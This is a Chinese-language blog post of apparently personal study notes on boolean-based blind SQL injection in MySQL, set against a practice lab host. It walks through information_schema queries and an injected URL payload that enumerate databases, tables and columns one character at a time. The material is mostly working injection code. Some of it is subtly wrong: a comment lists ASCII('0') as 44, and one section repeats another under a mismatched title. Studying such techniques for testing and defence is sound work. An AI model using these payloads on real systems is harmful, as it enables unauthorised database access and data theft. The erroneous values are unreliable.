---
date: "2020-12-09T00:00:00Z"
description: 查询 MYSQL 数据库 系统库名、表名、字段名 SQL语句
keywords: SQL注入, SQLMAP
tags:
- 安全
- SQL注入
title: 查询 MYSQL 数据库 系统库名、表名、字段名 SQL语句
---

# 查询 MYSQL 数据库 系统库名、表名、字段名 SQL语句

> 注意: 由于 **引号** 的原因， 盲注时字符探测不能使用 **字符** 。 而应该使用 **ASCII** 进行转换。

## 0x01 数据库探测

### 0x01.1 数据库数量探测

```sql
-- 数据库数量探测

http://vulhub.example.com:81/Pass-10/index.php?id=1  AND (SELECT COUNT(*) FROM information_schema.SCHEMATA)=6

```

![boolblind-database-number-detect.png](/images/2020/12/09/boolblind-database-number-detect.png)

### 0x01.2 当前数据库名称探测

```sql


-- 查询当前数据库有多少张表
SELECT COUNT(*) FROM information_schema.`TABLES` WHERE TABLE_SCHEMA=database(); 

-- -- 探测表名
-- 1.1 查询当前数据库表名。
SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()  ;

-- 1.2 使用 limit 查询返回数量， LIMIT 起始值为 0 。
SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1  ;
SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 1,1  ;

-- 2.1 表名长度
SELECT LENGTH((SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1))  ;

-- 2.2 表名探测, SUBSTR() 函数起始值为 1 。
SELECT SUBSTR((SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1),1,1) ;

-- 2.3 判断
SELECT 'n'=(SELECT SUBSTR((SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1),1,1)) ;
```
## 0x02 表探测

```sql
-- 查询当前数据库有多少张表
SELECT COUNT(*) FROM information_schema.`TABLES` WHERE TABLE_SCHEMA=database(); 

-- -- 探测表名
-- 1.1 查询当前数据库表名。
SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=(SELECT database())  ;

-- 1.2 使用 limit 查询返回数量， LIMIT 起始值为 0 。
SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=(SELECT database()) LIMIT 0,1  ;
-- result: news
SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=(SELECT database()) LIMIT 1,1  ;
-- result: uses

-- 2.1 表名长度
SELECT LENGTH((SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=(SELECT database()) LIMIT 0,1))  ;

-- 2.2 表名探测, SUBSTR() 函数起始值为 1 。
SELECT SUBSTR((SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=(SELECT database()) LIMIT 0,1),1,1) ;

-- 2.3 判断
SELECT 'n'=(SELECT SUBSTR((SELECT DISTINCT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=(SELECT database()) LIMIT 0,1),1,1)) ;

```

### 0x03 字段探测

```sql
-- dbname: zkaq
-- tablename: news

-- 1.1 探测所有字段数量
SELECT count(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='zkaq' AND TABLE_NAME='news';
-- 1.2 探测所有字段
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='zkaq' AND TABLE_NAME='news';
-- 1.2 某一个字段
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='zkaq' AND TABLE_NAME='news' LIMIT 0,1;

-- 2.1 探测字段名字符
SELECT SUBSTR((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='zkaq' AND TABLE_NAME='news' LIMIT 0,1),1,1) ;
-- 2.2 探测字段名 BOOL
SELECT 'i'=(SUBSTR((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='zkaq' AND TABLE_NAME='news' LIMIT 0,1),1,1)) ;

```

## ASCII 字符转换

```sql

-- ASCII

SELECT ASCII('0'),ASCII('9'),ASCII('A'),ASCII('Z'),ASCII('a'),ASCII('z'),ASCII('_'),ASCII('-') ;

-- 95
SELECT ASCII('_') ;
-- 45
SELECT ASCII('-') ;

-- 44
SELECT ASCII('0') ;
-- 57
SELECT ASCII('9') ;

-- 64
SELECT ASCII('A') ; 
-- 90
SELECT ASCII('Z') ; 

-- 97
SELECT ASCII('a') ; 
-- 122
SELECT ASCII('z') ; 

```


## 0xGG 参考文章

+ [SQL布尔型盲注思路分析（入门必看）](https://blog.csdn.net/qq_35544379/article/details/77351783)

+ [ASCII 对照表](https://tool.oschina.net/commons?type=4)
